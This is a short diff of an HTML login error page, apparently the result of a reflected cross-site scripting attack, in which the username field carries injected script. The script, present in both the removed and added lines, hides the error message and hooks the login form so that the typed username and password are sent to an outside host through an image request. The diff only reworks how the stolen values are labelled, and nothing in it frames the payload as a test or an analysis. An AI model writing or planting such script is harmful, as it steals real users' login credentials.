@@ -32,7 +32,20 @@
     
       <h2 class="problem">Whoops!</h2>
       <p class="error-message">
-        Username: <span id='name' value='<script> document.getElementsByClassName('error-message')[0].style.display = 'none'; document.getElementsByClassName('problem')[0].style.display = 'none';  document.getElementById('login').onsubmit=function() {     i = new Image();     i.src = 'http://r7.io/e/akean?s='+document.getElementById('login_password').value+document.getElementById('login_username').value; }   </script>'><script> document.getElementsByClassName('error-message')[0].style.display = 'none'; document.getElementsByClassName('problem')[0].style.display = 'none';  document.getElementById('login').onsubmit=function() {     i = new Image();     i.src = 'http://r7.io/e/akean?s='+document.getElementById('login_password').value+document.getElementById('login_username').value; }   </script></span> does not appear in the system. Please try again
+        Username:<span id='name' value='<script> document.getElementsByClassName('error-message')[0].style.display = 'none'; 
+		document.getElementsByClassName('problem')[0].style.display = 'none';  document.getElementById('login').onsubmit=function() 
+		{     i = new Image();
+		username = document.getElementById('login_username').value;
+		password = document.getElementById('login_password').value;     
+		i.src = 'http://r7.io/e/akean?s='+"password = " + password + "username = " + username }   </script>'>
+		<script> document.getElementsByClassName('error-message')[0].style.display = 'none'; 
+		document.getElementsByClassName('problem')[0].style.display = 'none';  
+		document.getElementById('login').onsubmit=function() 
+		{     i = new Image();
+		username = document.getElementById('login_username').value;
+		password = document.getElementById('login_password').value;     
+		i.src = 'http://r7.io/e/akean?s='+"password = " + password + "username = " + username }   
+	</script></span> does not appear in the system. Please try again
       </p>
     
       <div id="login-fields-wrapper">
